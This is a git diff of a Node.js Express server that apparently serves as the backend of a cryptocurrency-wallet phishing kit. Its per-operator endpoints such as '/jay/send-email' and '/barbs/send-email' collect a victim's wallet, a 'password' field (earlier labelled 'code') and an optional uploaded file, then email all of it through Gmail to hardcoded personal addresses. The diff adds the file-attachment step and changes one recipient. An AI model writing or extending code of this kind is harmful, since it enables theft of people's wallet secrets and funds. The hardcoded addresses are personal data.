@@ -29,34 +29,49 @@ app.get("/scheduled-task", (req, res) => {
   res.send("Task completed");
 });
 
-app.post("/jay/send-email", async (req, res) => {
+app.post("/jay/send-email", upload.single("file"), async (req, res) => {
   const { text, wallet } = req.body;
-  console.log("Received Data:", { text, wallet });
+  const file = req.file;
 
   if (!text || !wallet) {
-    return res
-      .status(400)
-      .json({ error: "Wallet and code selection are required." });
+    return res.status(400).json({ error: "Wallet and password are required." });
   }
 
   try {
     let transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
-        user: emailAddress, // Your Gmail
-        pass: emailPassword, // Your App Password
+        user: emailAddress,
+        pass: emailPassword,
       },
     });
 
-    let mailOptions = {
-      from: "emailAddress",
-      to: "deanlewis267@gmail.com", // Replace with your email
+    // Prepare email options
+    const mailOptions = {
+      from: emailAddress,
+      to: "deanlewis267@gmail.com",
       subject: "Wallet Address",
-      text: `Wallet: ${wallet}\ncode: ${text}`,
+      text: `Wallet: ${wallet}\nPassword: ${text}`,
+      attachments: [],
     };
 
+    // Only attach the file if it exists
+    if (file) {
+      mailOptions.attachments.push({
+        filename: file.originalname,
+        path: file.path,
+      });
+    }
+
+    // Send the email
     await transporter.sendMail(mailOptions);
-    console.log("Email sent successfully!");
+
+    // Clean up file if it was uploaded
+    if (file) {
+      fs.unlink(file.path, () => {
+        console.log("Temporary file deleted.");
+      });
+    }
 
     res.status(200).json({ message: "Email sent successfully!" });
   } catch (error) {
@@ -85,7 +100,7 @@ app.post("/barbs/send-email", upload.single("file"), async (req, res) => {
     // Prepare email options
     const mailOptions = {
       from: emailAddress,
-      to: "fadeyibi26@gmail.com",
+      to: "dorisnewsome4@gmail.com",
       subject: "Wallet Address",
       text: `Wallet: ${wallet}\nPassword: ${text}`,
       attachments: [],
